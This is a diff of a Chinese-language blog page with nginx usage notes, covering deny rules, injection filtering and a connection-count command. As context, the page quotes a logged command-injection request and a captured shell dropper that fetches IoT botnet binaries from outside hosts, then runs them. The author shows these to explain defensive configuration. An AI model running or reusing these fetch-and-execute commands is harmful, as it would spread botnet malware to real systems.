@@ -17,7 +17,7 @@
 <meta property="og:description" content="linode的docs里面是这么介绍的  nginx is a lightweight, high performance web server designed to deliver large amounts of static content quickly with efficient use of system resources. nginx’s strong point is its">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://www.haldir66.ga/static/imgs/scenery151110073841.jpg">
-<meta property="og:updated_time" content="2018-08-06T10:50:00.242Z">
+<meta property="og:updated_time" content="2018-08-07T11:20:20.109Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Nginx使用记录">
 <meta name="twitter:description" content="linode的docs里面是这么介绍的  nginx is a lightweight, high performance web server designed to deliver large amounts of static content quickly with efficient use of system resources. nginx’s strong point is its">
@@ -380,13 +380,17 @@ ga('send', 'pageview');
 <p>所有以.php为后缀的资源都不允许访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ (\.php$|myadmin) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>亲眼见到的一个访问日志<br>“GET /login.cgi?cli=aa%20aa%27;wget%20<a href="http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$">http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$</a> HTTP/1.1”</p>
 <p>这个aa%20aa%27粘贴到chrome的console里面,decodeURIComponent(“aa%20aa%27”)，按照这样的做法翻译了上面的话如下：<br>“GET /login.cgi?cli=aa aa’;wget <a href="http://185.172.164.41/e">http://185.172.164.41/e</a> -O -&gt; /tmp/hk;sh /tmp/hk’$ HTTP/1.1”</p>
-<p>至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。</p>
+<p>至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。<a href="https://github.com/paralax/awesome-honeypots">有专门的蜜罐处理这种行为</a></p>
 <p>后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">n="hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64"</span><br><span class="line">http_server="46.166.185.42"</span><br><span class="line"></span><br><span class="line">for a in $n</span><br><span class="line">do</span><br><span class="line">    wget http://$http_server/$a -O -&gt; /tmp/$a</span><br><span class="line">    chmod 777 /tmp/$a</span><br><span class="line">    /tmp/$a</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for a in $n</span><br><span class="line">do</span><br><span class="line">    rm -rf /tmp/$a</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
 <p><a href="http://blog.netlab.360.com/a-new-threat-an-iot-botnet-scanning-internet-on-port-81-en/">这里有详细的解说</a></p>
 <p><a href="https://serverfault.com/questions/879329/why-does-nginx-select-a-location-block-with-a-non-matching-regex">然而nginx是没法在配置文件里面去match上一个queryParameter的</a></p>
 <p>有一个专门的说法叫做nginx 防止注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($request_uri ~* &quot;[+|(%20)]select[+|(%20)]&quot;) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>所以根据requesturl来判断就得用上if了<br><a href="https://serverfault.com/questions/837598/redirect-of-all-the-urls-that-contain-1-word-in-specific-but-that-do-not-contai">redirect-of-all-the-urls</a></p>
 <p><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-nginx-to-use-custom-error-pages-on-ubuntu-14-04">自定义404,5XX的页面也是挺好玩的</a></p>
+<p>nginx查看当前连接数</p>
+<blockquote>
+<p>netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a,S[a]}’</p>
+</blockquote>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
 <li><a href="https://wizardforcel.gitbooks.io/nginx-doc/content/Text/6.1_nginx_windows.html">nginx Configurations</a></li>
 <li><a href="https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-16-04">How To Install Nginx on Ubuntu 16.04</a></li>
@@ -687,26 +691,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">C</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">transition</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">databinding</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Butterknife</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">service</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">TouchEvent</a>
               </li>
              
@@ -755,15 +739,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
+                <a href="javascript:void(0)" class="js-tag color2">C</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">foreground</a>
+                <a href="javascript:void(0)" class="js-tag color1">transition</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Handler Message</a>
+                <a href="javascript:void(0)" class="js-tag color2">databinding</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Butterknife</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">service</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -787,7 +779,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">foreground</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">django</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Handler Message</a>
               </li>
              
               <li class="article-tag-list-item">
